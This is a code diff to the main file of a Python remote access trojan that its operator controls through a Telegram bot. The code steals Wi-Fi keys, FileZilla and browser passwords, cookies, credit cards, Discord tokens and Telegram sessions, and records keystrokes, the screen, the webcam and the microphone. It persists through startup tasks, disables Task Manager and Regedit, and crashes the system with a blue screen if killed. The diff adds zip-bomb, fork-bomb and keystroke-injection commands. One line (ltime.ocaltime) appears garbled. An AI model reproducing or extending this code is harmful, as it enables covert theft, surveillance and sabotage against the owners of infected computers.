@@ -1,7 +1,4 @@
-import sys
-import telebot
-
-from RAT import *
+from RAT                           import *
 
 from Core.Settings.Organization    import *
 from Core.Settings.Antivirus       import *
@@ -25,7 +22,9 @@ from Core.Fun.Message              import *
 from Core.Fun.Speak                import *
 from Core.Fun.OpenURL              import *
 from Core.Fun.Wallpapers           import *
-from Core.Fun.ForkBomb             import *
+
+from Core.Bomb.ZipBomb             import *
+from Core.Bomb.ForkBomb            import *
 
 from Core.Stealer.Wifi             import *
 from Core.Stealer.FileZilla        import *
@@ -35,11 +34,14 @@ from Core.Stealer.Telegram         import *
 
 from Core.Other.Clipboard          import *
 from Core.Other.Keylogger          import *
+from Core.Other.SendKeys           import *
 from Core.Other.Monitor            import *
 from Core.Other.Volume             import *
 from Core.Other.Rotate             import *
 from Core.Other.Freeze             import *
 from Core.Other.DVD                import *
+
+import telebot
 
 bot = telebot.TeleBot(TelegramToken, threaded=True)
 bot.worker_pool = telebot.util.ThreadPool(num_threads=50)
@@ -123,14 +125,14 @@ button4 = telebot.types.KeyboardButton('/Message\n💬')
 button5 = telebot.types.KeyboardButton('/Speak\n📢')
 button6 = telebot.types.KeyboardButton('/OpenURL\n🌐')
 button7 = telebot.types.KeyboardButton('/Wallpapers\n🧩')
-button8 = telebot.types.KeyboardButton('/ForkBomb\n⏱')
 main8.row(button1, button3, button2)
 main8.row(button4, button5)
-main8.row(button6, button7, button8)
+main8.row(button6, button7)
 
 
 # Create a folder to save temporary files
 
+Expansion = os.path.splitext(os.path.basename(sys.argv[0]))[1]
 CurrentName = os.path.basename(sys.argv[0])
 CurrentPath = sys.argv[0]
 
@@ -141,45 +143,36 @@ RAT = [
 	]
 
 for Directories in RAT:
+
 	if not os.path.exists(Directories):
 		os.makedirs(Directories)
-
-
-
-# Checks if the script is running  computer of the anti-virus organization
-
-if Organization() is True:
-	sys.exit()
 
 
 # Run as Administrator
 
 if AdminRightsRequired is True:
-	if Admin() is False:
-		while True:
-			try:
-				print('[~] › Trying elevate previleges to administrator\n')
-				os.startfile(CurrentPath, 'runas')
-			except:
-				pass
-			else:
-				print('[+] › ' + CurrentName + ' opened as admin rights\n')
-				break
 
-
-# Checks if the file is running as an administrator
-
-if AdminRightsRequired is True:
-	if Admin() is False:
-		sys.exit()
+	if Expansion == '.py':
+		print('[-] › Running with admin rights is not supported for extension .py\n')
+	else:
+		if Admin() is False:
+			while True:
+				try:
+					print('[~] › Trying elevate previleges to administrator\n')
+					os.startfile(CurrentPath, 'runas')
+				except:
+					pass
+				else:
+					print('[+] › ' + CurrentName + ' opened as admin rights\n')
+					sys.exit()
 
 
 # Disables TaskManager
 
 if DisableTaskManager is True:
-	if os.path.exists(Directory + 'RegeditDisableTaskManager'):
-		print('[+] › Task Manager is already disabled\n')
 
+	if os.path.exists(Directory + 'RegeditDisableTaskManager'):
+		print('[+] › taskmgr.exe is already disabled\n')
 	else:
 		if Admin() is False:
 			print('[-] › This function requires admin rights\n')
@@ -187,15 +180,15 @@ if DisableTaskManager is True:
 		if Admin() is True:
 			RegeditDisableTaskManager()
 			open(Directory + 'RegeditDisableTaskManager', 'a').close()
-			print('[+] › Task Manager is disabled\n')
+			print('[+] › taskmgr.exe has been disabled\n')
 
 
 # Disables Regedit
 
 if DisableRegistryTools is True:
-	if os.path.exists(Directory + 'RegeditDisableRegistryTools'):
-		print('[+] › Regedit is already disabled\n')
 
+	if os.path.exists(Directory + 'RegeditDisableRegistryTools'):
+		print('[+] › regedit.exe is already disabled\n')
 	else:
 		if Admin() is False:
 			print('[-] › This function requires admin rights\n')
@@ -203,18 +196,18 @@ if DisableRegistryTools is True:
 		if Admin() is True:
 			RegeditDisableRegistryTools()
 			open(Directory + 'RegeditDisableRegistryTools', 'a').close()
-			print('[+] › Regedit is disabled\n')
+			print('[+] › regedit.exe has been disabled\n')
 
 
 # Adds a program to startup
 
 if AutorunEnabled is True:
-	if SchtasksExists(AutorunName) and InstallPathExists(InstallPath, ProcessName) is True:
-		print('[+] › '+ CurrentName +' ‹ is already in startup › ' + InstallPath + ProcessName + '\n')
 
+	if SchtasksExists(AutorunName) and InstallPathExists(InstallPath, ProcessName) is True:
+		print('[+] › ' + CurrentName + ' ‹ is already in startup › ' + InstallPath + ProcessName + '\n')
 	else:
 		if Admin() is False:
-			print('[-] › This function requires admin rights!\n')
+			print('[-] › This function requires admin rights\n')
 
 		if Admin() is True:
 			AddToAutorun(AutorunName, InstallPath, ProcessName)
@@ -225,12 +218,13 @@ if AutorunEnabled is True:
 				except:
 					pass
 
-			print('[+] › ' + CurrentName+' ‹ copied to startup › ' + InstallPath + ProcessName + '\n')
+			print('[+] › ' + CurrentName + ' ‹ has been copied to startup › ' + InstallPath + ProcessName + '\n')
 
 
 # Displays a message on the screen.
 
 if DisplayMessageBox is True:
+
 	if not os.path.exists(Directory + 'DisplayMessageBox'):
 		open(Directory + 'DisplayMessageBox', 'a').close()
 		MessageBox(Message)
@@ -239,23 +233,25 @@ if DisplayMessageBox is True:
 # Protect process with BSoD (if killed).
 
 if ProcessBSODProtectionEnabled is True:
+
 	if Admin() is False:
 		print('[-] › This function requires admin rights\n')
 
 	if Admin() is True:
-		SetProtection()
-		print('[+] › Process protection is activated\n')
+		if platform.release() == '10':
+			Thread(target=ProcessChecker).start()
 
+		if platform.release() != '10':
+			SetProtection()
 
-# Activates the keylogger thread
-
-Thread(target=Threader).start()
+		print('[+] › Process protection has been activated\n')
 
 
 # Sends an online message
 
 while True:
 	try:
+
 		if Admin() is True:
 			Online = '🔘 Online!'
 
@@ -275,6 +271,7 @@ while True:
 	except Exception as e:
 		print('[-] › Retrying connect to api.telegram.org\n')
 		print(e)
+
 	else:
 		print('[+] › Connected to api.telegram.org\n')
 		break
@@ -285,6 +282,7 @@ while True:
 @bot.message_handler(regexp='/Screen')
 def Screen(command):
 	try:
+
 		bot.send_chat_action(command.chat.id, 'upload_photo')
 		File = Directory + 'Screenshot.jpg'
 
@@ -292,6 +290,7 @@ def Screen(command):
 		Screen = open(File, 'rb')
 
 		bot.send_photo(command.chat.id, Screen)
+
 	except:
 		pass
 
@@ -301,6 +300,7 @@ def Screen(command):
 @bot.message_handler(regexp='/Webcam')
 def Webcam(command):
 	try:
+
 		bot.send_chat_action(command.chat.id, 'upload_photo')
 		File = Directory + 'Webcam.jpg'
 
@@ -311,6 +311,7 @@ def Webcam(command):
 		Webcam = open(File, 'rb')
 
 		bot.send_photo(command.chat.id, Webcam)
+
 	except:
 		bot.reply_to(command, '_Webcam not found._', parse_mode='Markdown')
 
@@ -320,19 +321,24 @@ def Webcam(command):
 @bot.message_handler(regexp='/Audio')
 def Audio(command):
 	try:
+
 		Seconds = re.split('/Audio ', command.text, flags=re.I)[1]
 		bot.send_message(command.chat.id, '_Recording..._', parse_mode='Markdown')
 		try:
+
 			File = Directory + 'Audio.wav'
 
 			Microphone(File, Seconds)
 			Audio = open(File, 'rb')
 
 			bot.send_voice(command.chat.id, Audio)
+
 		except ValueError:
 			bot.reply_to(command, '_Specify the recording time in seconds._', parse_mode='Markdown')
+
 		except:
 			bot.reply_to(command, '_Microphone not found._', parse_mode='Markdown')
+
 	except:
 		bot.send_message(command.chat.id, '_Specify the recording duration_\n\n*› /Audio*', parse_mode='Markdown')
 
@@ -341,7 +347,9 @@ def Audio(command):
 
 def SendMessage(call, text):
 	try:
+
 		bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=text, parse_mode='Markdown')
+
 	except:
 		pass
 
@@ -356,7 +364,7 @@ def CallbackInline(command):
 		# Hibernate button
 
 		if command.data == 'hibernate':
-			SendMessage(command, '*Hibernate* _command received!_')
+			SendMessage(command, '_Hibernate command received!_')
 			UnsetProtection()
 			Hibernate()
 
@@ -364,7 +372,7 @@ def CallbackInline(command):
 		# Shutdown button
 
 		if command.data == 'shutdown':
-			SendMessage(command, '*Shutdown* _command received!_')
+			SendMessage(command, '*Shutdown* command received!')
 			UnsetProtection()
 			Shutdown()
 
@@ -372,7 +380,7 @@ def CallbackInline(command):
 		# Reboot button
 
 		if command.data == 'restart':
-			SendMessage(command, '*Restart* _command received!_')
+			SendMessage(command, '*Restart* command received!')
 			UnsetProtection()
 			Restart()
 
@@ -380,7 +388,7 @@ def CallbackInline(command):
 		# Button that ends a user session
 
 		if command.data == 'logoff':
-			SendMessage(command, '*Logoff* _command received!_')
+			SendMessage(command, '*Logoff* command received!')
 			UnsetProtection()
 			Logoff()
 
@@ -388,7 +396,7 @@ def CallbackInline(command):
 		# Button killing system with blue screen of death
 
 		if command.data == 'bsod':
-			SendMessage(command, '*Blue Screen of Death* _is activated!_')
+			SendMessage(command, 'The *Blue Screen of Death* has been activated!')
 			UnsetProtection()
 			BSoD()
 
@@ -396,10 +404,12 @@ def CallbackInline(command):
 		# Button processing which adds a trojan to startup (schtasks)
 
 		if command.data == 'startup':
+
 			if SchtasksExists(AutorunName) and InstallPathExists(InstallPath, ProcessName) is True:
-				SendMessage(command, '*' + ProcessName + '* _is already in startup._')
+				SendMessage(command, '*' + ProcessName + '* is already in startup.')
 
 			else:
+
 				if Admin() is False:
 					SendMessage(command, '_This function requires admin rights._')
 
@@ -412,7 +422,7 @@ def CallbackInline(command):
 						except:
 							pass
 
-					SendMessage(command, '*' + ProcessName + '* _copied to startup!_')
+					SendMessage(command, '*' + ProcessName + '* has been copied to startup!')
 
 
 		# Button processing that confirms the removal of a trojan
@@ -425,31 +435,34 @@ def CallbackInline(command):
 		# Handling the <<Uninstall>> Button
 
 		if command.data == 'uninstall':
-			SendMessage(command, '*' + CurrentName + '* _is uninstalled!_')
+			SendMessage(command, '*' + CurrentName + '* has been uninstalled!')
 			Uninstall(AutorunName, InstallPath, ProcessName, CurrentName, CurrentPath, Directory)
 
 
 		# Handling the <<Kill All Processes>> Button
 
 		if command.data == 'taskkill all':
+			SendMessage(command, '_Terminating processes..._')
 			TaskkillAll(CurrentName)
-			SendMessage(command, '_All processes is stopped!_')
+			SendMessage(command, '_All processes has been terminated!_')
 
 
 		# Handling the <<Disable Task Manager>> Button
 
 		if command.data == 'disabletaskmgr':
+
 			if os.path.exists(Directory + 'RegeditDisableTaskManager'):
-				SendMessage(command, '*Task Manager* _is already disabled._')
+				SendMessage(command, '*taskmgr.exe* is already disabled.')
 
 			else:
+
 				if Admin() is False:
 					SendMessage(command, '_This function requires admin rights._')
 
 				if Admin() is True:
 					RegeditDisableTaskManager()
 					open(Directory + 'RegeditDisableTaskManager', 'a').close()
-					SendMessage(command, '*Task Manager* _is disabled!_')
+					SendMessage(command, '*taskmgr.exe* has been disabled!')
 
 
 		# Handling the <<Back>> Button
@@ -463,13 +476,14 @@ def CallbackInline(command):
 @bot.message_handler(regexp='/CD')
 def CD(command):
 	try:
+
 		Path = re.split('/CD ', command.text, flags=re.I)[1]
-
 		os.chdir(Path)
-
 		bot.send_message(command.chat.id, '_Directory Changed!_\n\n`' + os.getcwd() + '`', parse_mode='Markdown')
+
 	except FileNotFoundError:
-		bot.reply_to(command, '_Directory not found!._', parse_mode='Markdown')
+		bot.reply_to(command, '_Directory not found._', parse_mode='Markdown')
+
 	except:
 		bot.send_message(command.chat.id, '_Current Directory_\n\n`' + os.getcwd() + '`\n\n_Username_\n\n`' + os.getlogin() + '`', parse_mode='Markdown')
 
@@ -479,17 +493,18 @@ def CD(command):
 @bot.message_handler(regexp='/ls')
 def ls(command):
 	try:
-		Dirs = '\n``'.join(os.listdir())
 
+		Dirs = '\n``'.join(os.listdir())
 		bot.send_message(command.chat.id, '`' + os.getcwd() + '`\n\n' + '`' + Dirs + '`', parse_mode='Markdown')
+
 	except:
 		try:
-			Dirse = '\n'.join(os.listdir())
 
+			Dirse = '\n'.join(os.listdir())
 			SplittedText = telebot.util.split_string(Dirse, 4096)
 			for Dirse in SplittedText:
-
 				bot.send_message(command.chat.id, '`' + Dirse + '`', parse_mode='Markdown')
+
 		except PermissionError:
 				bot.reply_to(command, '_Permission denied._', parse_mode='Markdown')
 
@@ -499,10 +514,10 @@ def ls(command):
 @bot.message_handler(commands=['Remove', 'remove'])
 def Remove(command):
 	try:
-		File = re.split('/Remove ', command.text, flags=re.I)[1]
 
+		File = re.split('/Remove ', command.text, flags=re.I)[1]
 		Created = os.path.getctime(os.getcwd() + '\\' + File)
-		Year, Month, Day, Hour, Minute, Second=localtime(Created)[:-3]
+		Year, Month, Day, Hour, Minute, Second=ltime.ocaltime(Created)[:-3]
 
 		def ConvertBytes(num):
 			for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
@@ -516,7 +531,7 @@ def Remove(command):
 				return ConvertBytes(FileInfo.st_size)
 
 		bot.send_message(command.chat.id, 
-			'_File_ *' + File + '* _removed!_' 
+			'File *' + File + '* removed!' 
 			'\n' 
 			'\n*Created* » `%02d/%02d/%d'%(Day, Month, Year) + '`' +
 			'\n*Size* » `' + FileSize(os.getcwd() + '\\' + File) + '`',
@@ -526,9 +541,9 @@ def Remove(command):
 
 	except:
 		try:
+
 			Created = os.path.getctime(os.getcwd() + '\\' + File)
 			Year, Month, Day, Hour, Minute, Second=localtime(Created)[:-3]
-
 			Folder = os.getcwd() + '\\' + File
 			FolderSize = 0
 
@@ -545,7 +560,7 @@ def Remove(command):
 			shutil.rmtree(os.getcwd() + '\\' + File)
 
 			bot.send_message(command.chat.id, 
-				'_Folder_ *' + File + '* _removed!_'
+				'Folder *' + File + '* removed!'
 				'\n'
 				'\n*Created* » `%02d/%02d/%d'%(Day, Month, Year) + '`' +
 				'\n*Size* » `%0.1f MB' % (FolderSize/(1024*1024.0)) + '`' +
@@ -554,8 +569,10 @@ def Remove(command):
 
 		except FileNotFoundError:
 			bot.reply_to(command, '_File not found._', parse_mode='Markdown')
+
 		except PermissionError:
 			bot.reply_to(command, '_Permission denied._', parse_mode='Markdown')
+
 		except:
 			bot.send_message(command.chat.id, '_Enter a file name_\n\n*› /Remove • /RemoveAll*', parse_mode='Markdown')
 
@@ -565,6 +582,7 @@ def Remove(command):
 @bot.message_handler(commands=['RemoveAll', 'removeall'])
 def RemoveAll(command):
 	try:
+
 		bot.send_message(command.chat.id, '_Removing files..._', parse_mode='Markdown')
 
 		FolderSize = 0
@@ -594,12 +612,13 @@ def RemoveAll(command):
 		b = len(list)
 		c = (a - b)
 
-		bot.send_message(command.chat.id,
-			'_Removed_ *' + str(c) + '* _files out of_ *' + str(a) + '!*'
+		bot.reply_to(command,
+			'Removed *' + str(c) + '* files out of *' + str(a) + '!*'
 			'\n'
 			'\nSize » `%0.1f MB' % (FolderSize/(1024*1024.0)) + '`' +
 			'\nContained » `' + '{:,} Files, {:,} Folders'.format(Files, Folders) + '`',
 				parse_mode='Markdown')
+
 	except:
 		pass
 
@@ -609,16 +628,18 @@ def RemoveAll(command):
 @bot.message_handler(regexp='/Upload')
 def Upload(command):
 	try:
+
 		URL = re.split('/Upload ', command.text, flags=re.I)[1]
 		bot.send_message(command.chat.id, '_Uploading file..._', parse_mode='Markdown')
 
 		Filename = os.getcwd() + '\\' + os.path.basename(URL)
-
-		r = urlretrieve(URL, Filename)
+		r = urllib.request.urlretrieve(URL, Filename)
 
 		bot.reply_to(command, '_File uploaded to computer!_\n\n`' + Filename + '`', parse_mode='Markdown')
+
 	except ValueError:
 		bot.reply_to(command, '_Insert a direct download link._', parse_mode='Markdown')
+
 	except:
 		bot.send_message(command.chat.id, '_Send file or paste URL_\n\n*› /Upload*', parse_mode='Markdown')
 
@@ -628,9 +649,9 @@ def Upload(command):
 @bot.message_handler(content_types=['document'])
 def Document(command):
 	try:
+
 		File = bot.get_file(command.document.file_id)
 		bot.send_message(command.chat.id, '_Uploading file..._', parse_mode='Markdown')
-
 		DownloadedFile = bot.download_file(File.file_path)
 		Source = Directory + File.file_path;
 		with open(Source, 'wb') as NewFile:
@@ -638,12 +659,14 @@ def Document(command):
 
 		Final = os.getcwd() + '\\' + Source.split(File.file_path)[1] + command.document.file_name
 		shutil.move(Source, Final)
-
 		bot.reply_to(command, '_File uploaded to computer!_\n\n`' + Final + '`', parse_mode='Markdown')
+
 	except FileNotFoundError:
 		bot.reply_to(command, '_File format is not supported._', parse_mode='Markdown')
+
 	except OSError:
 		bot.reply_to(command, '_Try saving the file in a different directory._', parse_mode='Markdown')
+
 	except:
 		bot.reply_to(command, '_You cannot upload a file larger than 20 MB._', parse_mode='Markdown')
 
@@ -653,39 +676,40 @@ def Document(command):
 @bot.message_handler(regexp='/Download')
 def Download(command):
 	try:
+
 		File = re.split('/Download ', command.text, flags=re.I)[1]
-
 		Download = open(os.getcwd() + '\\' + File, 'rb')
-
 		bot.send_message(command.chat.id, '_Sending file..._', parse_mode='Markdown')
 		bot.send_document(command.chat.id, Download)
+
 	except FileNotFoundError:
 		bot.reply_to(command, '_File not found._', parse_mode='Markdown')
+
 	except:
 		try:
+
 			File = re.split('/Download ', command.text, flags=re.I)[1]
 			bot.send_message(command.chat.id, '_Archiving..._', parse_mode='Markdown')
-
 			shutil.make_archive(Directory + File,
 								'zip',
 								os.getcwd() + '\\',
 								File)
 			iFile = open(Directory + File + '.zip', 'rb')
-
 			bot.send_message(command.chat.id, '_Sending folder..._', parse_mode='Markdown')
 			bot.send_document(command.chat.id, iFile)
-
 			iFile.close()
 			os.remove(Directory + File + '.zip')
+
 		except PermissionError:
 			bot.reply_to(command, '_Permission denied._', parse_mode='Markdown')
+
 		except:
 			try:
+
 				iFile.close()
-
 				os.remove(Directory + File + '.zip')
-
 				bot.reply_to(command, '_You cannot download a file larger than 50 MB._', parse_mode='Markdown')
+
 			except:
 				bot.send_message(command.chat.id, '_Enter a file name_\n\n*› /Download*', parse_mode='Markdown')
 
@@ -695,15 +719,17 @@ def Download(command):
 @bot.message_handler(commands=['Run', 'run'])
 def Run(command):
 	try:
+
 		File = re.split('/Run ', command.text, flags=re.I)[1]
-
 		os.startfile(os.getcwd() + '\\' + File)
+		bot.reply_to(command, 'File *' + File + '* has been running!', parse_mode='Markdown')
 
-		bot.reply_to(command, '_File_ *' + File + '* _is running!_', parse_mode='Markdown')
 	except FileNotFoundError:
 		bot.reply_to(command, '_File not found._', parse_mode='Markdown')
+
 	except OSError:
-		bot.reply_to(command, '_The file is isolated by the system and cannot be running._', parse_mode='Markdown')
+		bot.reply_to(command, '_File isolated by the system and cannot be running._', parse_mode='Markdown')
+
 	except:
 		bot.send_message(command.chat.id, '_Enter a file name_\n\n*› /Run • /RunAS*', parse_mode='Markdown')
 
@@ -713,13 +739,14 @@ def Run(command):
 @bot.message_handler(commands=['RunAS', 'runas'])
 def RunAS(command):
 	try:
+
 		File = re.split('/RunAS ', command.text, flags=re.I)[1]
-
 		os.startfile(os.getcwd() + '\\' + File, 'runas')
+		bot.reply_to(command, 'File *' + File + '* has been running!', parse_mode='Markdown')
 
-		bot.reply_to(command, 'File *' + File + '* is running!', parse_mode='Markdown')
 	except FileNotFoundError:
 		bot.reply_to(command, '_File not found._', parse_mode='Markdown')
+
 	except OSError:
 		bot.reply_to(command, '_Acces denied._', parse_mode='Markdown')
 	except:
@@ -738,14 +765,18 @@ def Tasklist(command):
 @bot.message_handler(regexp='/Taskkill')
 def Taskkill(command):
 	try:
-		Process = re.split('/Taskkill ', command.text, flags=re.I)[1]
 
+		Process = re.split('/Taskkill ', command.text, flags=re.I)[1]
 		KillProcess(Process)
 
 		if not Process.endswith('.exe'):
 			Process = Process + '.exe'
 
-		bot.reply_to(command, '_Process_ *' + Process + '* _is stopped!_', parse_mode='Markdown')
+		bot.reply_to(command, 'The process *' + Process + '* has been stopped!', parse_mode='Markdown')
+
+	except subprocess.CalledProcessError:
+		bot.reply_to(command, 'The process *' + Process + '* not found.', parse_mode='Markdown')
+
 	except:
 		bot.send_message(command.chat.id, 
 			'_Enter process name_'
@@ -763,11 +794,11 @@ def Taskkill(command):
 @bot.message_handler(regexp='/Message')
 def Message(command):
 	try:
+
 		Message = re.split('/Message ', command.text, flags=re.I)[1]
-
-		bot.reply_to(command, '_Message is sended!_', parse_mode='Markdown')
-
+		bot.reply_to(command, '_The message has been sended!_', parse_mode='Markdown')
 		SendMessageBox(Message)
+
 	except:
 		bot.send_message(command.chat.id, '_Enter your message_\n\n*› /Message*', parse_mode='Markdown')
 
@@ -777,13 +808,17 @@ def Message(command):
 @bot.message_handler(regexp='/Speak')
 def Speak(command):
 	try:
+
 		Text = re.split('/Speak ', command.text, flags=re.I)[1]
 		bot.send_message(command.chat.id, '_Speaking..._', parse_mode='Markdown')
 		try:
+
 			SpeakText(Text)
 			bot.reply_to(command, '_Successfully!_', parse_mode='Markdown')
+
 		except:
 			bot.reply_to(command, '_Failed to speak text._', parse_mode='Markdown')
+
 	except:
 		bot.send_message(command.chat.id, '_Enter your text_\n\n*› /Speak*', parse_mode='Markdown')
 
@@ -793,11 +828,11 @@ def Speak(command):
 @bot.message_handler(regexp='/OpenURL')
 def OpenURL(command):
 	try:
+
 		URL = re.split('/OpenURL ', command.text, flags=re.I)[1]
-
 		OpenBrowser(URL)
+		bot.reply_to(command, '_The URL has been opened!_', parse_mode='Markdown')
 
-		bot.reply_to(command, '_URL is opened!_', parse_mode='Markdown')
 	except:
 		bot.send_message(command.chat.id, '_Enter your URL_\n\n*› /OpenURL*', parse_mode='Markdown')
 
@@ -806,8 +841,8 @@ def OpenURL(command):
 
 @bot.message_handler(content_types=['photo'])
 def Wallpapers(command):
-	Photo = bot.get_file(command.photo[len(command.photo)-1].file_id)
 
+	Photo = bot.get_file(command.photo[len(command.photo)-1].file_id)
 	File = bot.get_file(command.photo[len(command.photo)-1].file_id)
 	DownloadedFile = bot.download_file(File.file_path)
 	Source = Directory + File.file_path;
@@ -815,16 +850,25 @@ def Wallpapers(command):
 		new_file.write(DownloadedFile)
 
 	SetWallpapers(Photo, Directory)
-
-	bot.reply_to(command, '_The photo is set on the wallpapers!_', parse_mode='Markdown')
+	bot.reply_to(command, '_ The Photo has been set on the Wallpapers!_', parse_mode='Markdown')
 
 
 # Infinite start CMD.exe
 
-@bot.message_handler(regexp='/Forkbomb')
-def Forkbomb(command):
+@bot.message_handler(regexp='/ForkBomb')
+def ForkBomb(command):
+
 	bot.send_message(command.chat.id, '_Preparing ForkBomb..._', parse_mode='Markdown')
-	ForkBomb()
+	Forkbomb()
+
+
+# Endless file creation
+
+@bot.message_handler(regexp='/ZipBomb')
+def ZipBomb(command):
+
+	bot.send_message(command.chat.id, '_Preparing ZipBomb..._', parse_mode='Markdown')
+	Zipbomb()
 
 
 # Gets Wifi Password
@@ -832,6 +876,7 @@ def Forkbomb(command):
 @bot.message_handler(regexp='/WiFi')
 def WiFi(command):
 	try:
+
 		bot.send_message(command.chat.id, 
 			'_Received Wi-Fi Data_'
 			'\n'
@@ -841,6 +886,7 @@ def WiFi(command):
 			'\n*Security Key* » `' + StealWifiPasswords()['SecurityKey'] + '`' +
 			'\n*Password* » `' + StealWifiPasswords()['Password'] + '`',
 				parse_mode='Markdown')
+
 	except:
 		bot.reply_to(command, '_Failed to authenticate Wi-Fi._', parse_mode='Markdown')
 
@@ -850,6 +896,7 @@ def WiFi(command):
 @bot.message_handler(regexp='/FileZilla')
 def FileZilla(command):
 	try:
+
 		bot.send_message(command.chat.id,
 			'_Received FileZilla Data_'
 			'\n'
@@ -857,6 +904,7 @@ def FileZilla(command):
 			'\n*Username* » `' + StealFileZilla()['Username'] + '`' +
 			'\n*Password* » `' + StealFileZilla()['Password'] + '`',
 				parse_mode='Markdown')
+
 	except:
 		bot.reply_to(command, '_FileZilla not installed._', parse_mode='Markdown')
 
@@ -866,7 +914,9 @@ def FileZilla(command):
 @bot.message_handler(regexp='/Discord')
 def Discord(command):
 	try:
+
 		bot.send_message(command.chat.id, '*Discord Token*\n\n`' + DiscordToken() + '`', parse_mode='Markdown')
+
 	except:
 		bot.reply_to(command, '_Discord not installed._', parse_mode='Markdown')
 
@@ -876,12 +926,14 @@ def Discord(command):
 @bot.message_handler(regexp='/Telegram')
 def Telegram(command):
 	try:
+
 		bot.send_chat_action(command.chat.id, 'upload_document')
 
 		TelegramSession(Directory)
 		Telegram = open(Directory + 'tdata.zip', 'rb')
 
 		bot.send_document(command.chat.id, Telegram)
+
 	except:
 		bot.reply_to(command, '_Telegram not installed._', parse_mode='Markdown')
 
@@ -891,6 +943,7 @@ def Telegram(command):
 @bot.message_handler(regexp='/CreditCards')
 def CreditCards(command):
 	try:
+
 		bot.send_chat_action(command.chat.id, 'upload_document')
 
 		with open(Directory + 'CreditCards.txt', 'w', encoding='utf-8') as f:
@@ -898,6 +951,7 @@ def CreditCards(command):
 
 		CreditCards = open(Directory + 'CreditCards.txt', 'rb')
 		bot.send_document(command.chat.id, CreditCards)
+
 	except:
 		bot.reply_to(command, '_CreditCards not found._', parse_mode='Markdown')
 
@@ -907,6 +961,7 @@ def CreditCards(command):
 @bot.message_handler(regexp='/Bookmarks')
 def Bookmarks(command):
 	try:
+
 		bot.send_chat_action(command.chat.id, 'upload_document')
 
 		with open(Directory + 'Bookmarks.txt', 'w', encoding='utf-8') as f:
@@ -914,6 +969,7 @@ def Bookmarks(command):
 
 		Bookmarks = open(Directory + 'Bookmarks.txt', 'rb')
 		bot.send_document(command.chat.id, Bookmarks)
+
 	except:
 		bot.reply_to(command, '_Bookmarks not found._', parse_mode='Markdown')
 
@@ -923,6 +979,7 @@ def Bookmarks(command):
 @bot.message_handler(regexp='/Passwords')
 def Passwords(command):
 	try:
+
 		bot.send_chat_action(command.chat.id, 'upload_document')
 
 		with open(Directory + 'Passwords.txt', 'w', encoding='utf-8') as f:
@@ -930,6 +987,7 @@ def Passwords(command):
 
 		Passwords = open(Directory + 'Passwords.txt', 'rb')
 		bot.send_document(command.chat.id, Passwords)
+
 	except:
 		bot.reply_to(command, '_Passwords not found._', parse_mode='Markdown')
 
@@ -939,6 +997,7 @@ def Passwords(command):
 @bot.message_handler(regexp='/Cookies')
 def Cookies(command):
 	try:
+
 		bot.send_chat_action(command.chat.id, 'upload_document')
 
 		with open(Directory + 'Cookies.txt', 'w', encoding='utf-8') as f:
@@ -946,6 +1005,7 @@ def Cookies(command):
 
 		Cookies = open(Directory + 'Cookies.txt', 'rb')
 		bot.send_document(command.chat.id, Cookies)
+
 	except:
 		bot.reply_to(command, '_Cookies not found._', parse_mode='Markdown')
 
@@ -955,6 +1015,7 @@ def Cookies(command):
 @bot.message_handler(regexp='/History')
 def History(command):
 	try:
+
 		bot.send_chat_action(command.chat.id, 'upload_document')
 
 		with open(Directory + 'History.txt', 'w', encoding='utf-8') as f:
@@ -962,6 +1023,7 @@ def History(command):
 
 		History = open(Directory + 'History.txt', 'rb')
 		bot.send_document(command.chat.id, History)
+
 	except:
 		bot.reply_to(command, '_History not found._', parse_mode='Markdown')
 
@@ -971,11 +1033,11 @@ def History(command):
 @bot.message_handler(regexp='/Clipboard')
 def Clipboard(command):
 	try:
+
 		Text = re.split('/Clipboard ', command.text, flags=re.I)[1]
-
 		SetClipboard(Text)
-
 		bot.reply_to(command, '_Clipboard contents changed!_', parse_mode='Markdown')
+
 	except:
 		bot.send_message(command.chat.id,
 			'_Enter your text_'
@@ -992,13 +1054,27 @@ def Clipboard(command):
 @bot.message_handler(regexp='/Keylogger')
 def Keylogger(command):
 	try:
+
 		bot.send_chat_action(command.chat.id, 'upload_document')
-
 		Keylogs = open(os.getenv('Temp') + '\\Keylogs.txt', 'rb')
-
 		bot.send_document(command.chat.id, Keylogs)
+
 	except:
 		bot.send_message(command.chat.id, '_No keylogs recorded._', parse_mode='Markdown')
+
+
+
+@bot.message_handler(regexp='/SendKeys')
+def SendKeys(command):
+	try:
+
+		Text = re.split('/SendKeys ', command.text, flags=re.I)[1]
+		bot.send_message(command.chat.id, '_Sending keys..._', parse_mode='Markdown')
+		SendKeyPress(Text)
+		bot.reply_to(command, '_Text successfully typed!_', parse_mode='Markdown')
+
+	except:
+		bot.send_message(command.chat.id, '_Enter your text_\n\n*› /SendKeys*', parse_mode='Markdown')
 
 
 # Display Rotate <0,90,180,270>
@@ -1006,11 +1082,11 @@ def Keylogger(command):
 @bot.message_handler(regexp='/Rotate')
 def Rotate(command):
 	try:
+
 		Position = re.split('/Rotate ', command.text, flags=re.I)[1]
-
 		DisplayRotate(Degrees=Position)
+		bot.reply_to(command, '_The Display has been rotated!_', parse_mode='Markdown')
 
-		bot.reply_to(command, '_Display is rotated!_', parse_mode='Markdown')
 	except:
 		bot.send_message(command.chat.id,
 			'_Select display rotation_'
@@ -1028,13 +1104,14 @@ def Rotate(command):
 @bot.message_handler(regexp='/Volume')
 def Volume(command):
 	try:
+
 		Level = re.split('/Volume ', command.text, flags=re.I)[1]
-
 		VolumeControl(Level)
-
 		bot.send_message(command.chat.id, '_Audio volume set to_ *' + Level + '* _level!_', parse_mode='Markdown')
+
 	except ValueError:
 		bot.send_message(command.chat.id, '_Specify the volume level in numbers_', parse_mode='Markdown')
+
 	except:
 		bot.send_message(command.chat.id, '_Specify the audio volume_\n\n*› /Volume*', parse_mode='Markdown')
 
@@ -1044,15 +1121,17 @@ def Volume(command):
 @bot.message_handler(regexp='/Monitor')
 def Monitor(command):
 	try:
+
 		Monitor = re.split('/Monitor ', command.text, flags=re.I)[1]
 
 		if Monitor.lower() == 'Off'.lower():
 			Off()
-			bot.reply_to(command, '_Monitor is Off_', parse_mode='Markdown')
+			bot.reply_to(command, '_The Monitor has been Off_', parse_mode='Markdown')
 
 		if Monitor.lower() == 'On'.lower():
 			On()
-			bot.reply_to(command, '_Monitor is On_', parse_mode='Markdown')
+			bot.reply_to(command, '_The Monitor has been On_', parse_mode='Markdown')
+
 	except:
 		bot.send_message(command.chat.id, 
 			'_Select monitor mode_'
@@ -1069,19 +1148,21 @@ def Monitor(command):
 
